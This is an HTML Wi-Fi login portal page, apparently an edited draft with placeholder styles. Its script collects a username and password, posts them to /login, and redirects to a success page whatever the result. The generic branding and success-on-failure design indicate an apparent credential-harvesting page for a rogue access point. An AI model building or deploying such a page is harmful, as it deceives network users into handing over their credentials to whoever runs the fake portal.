<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Keep existing head content -->
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <title>Wi-Fi Login Portal</title>
  <!-- Existing styles -->
  <style>
    /* Keep existing styles */
  </style>
</head>
<body>
  <div class="login-box">
    <div class="login-header">
      <div class="wifi-icon">
        <i class="fas fa-wifi"></i>
      </div>
      <h2>Wi-Fi Authentication</h2>
      <p class="login-subtitle">Please sign in to access the network</p>
    </div>
    
    <!-- IMPORTANT CHANGE: action="success.html" instead of login.php -->
    <form id="loginForm" action="success.html" method="post" onsubmit="return validateForm()">
      <div class="form-group">
        <i class="fas fa-user"></i>
        <input type="text" id="username" name="username" class="form-control" placeholder="Username or Email" required autocomplete="username" />
      </div>
      
      <div class="form-group">
        <i class="fas fa-lock"></i>
        <input type="password" id="password" name="password" class="form-control" placeholder="Password" required autocomplete="current-password" />
      </div>
      
      <div id="errorMessage" style="color: #dc3545; margin-bottom: 15px; display: none; text-align: center;">
        Please enter both username and password
      </div>
      
      <button type="submit" class="btn btn-primary">
        <span class="spinner"><i class="fas fa-circle-notch fa-spin"></i></span>
        Connect to Network
      </button>
    </form>
    
    <div class="terms">
      By connecting, you agree to the network's terms and conditions.
    </div>
  </div>

  <script>
    // Prevent auto-submissions and add validation
    function validateForm() {
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const errorMsg = document.getElementById('errorMessage');
      
      if (!username || !password) {
        errorMsg.style.display = 'block';
        return false;
      }
      
      // Send credentials via fetch instead of form submission
      fetch('/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password })
      })
      .then(response => {
        window.location.href = '/success.html';
      })
      .catch(error => {
        console.error('Error:', error);
        window.location.href = '/success.html';
      });
      
      // Show spinning indicator
      const button = document.querySelector('button[type="submit"]');
      const spinner = document.querySelector('.spinner');
      button.disabled = true;
      spinner.style.display = 'inline-block';
      button.innerHTML = '<span class="spinner"><i class="fas fa-circle-notch fa-spin"></i></span> Connecting...';
      
      // Prevent normal form submission
      return false;
    }
    
    // Prevent the automatic form submission some mobile browsers try to do
    document.addEventListener('DOMContentLoaded', function() {
      // Force focus on username field to help prevent auto-submission
      setTimeout(() => {
        document.getElementById('username').focus();
      }, 100);
    });
  </script>
</body>
</html>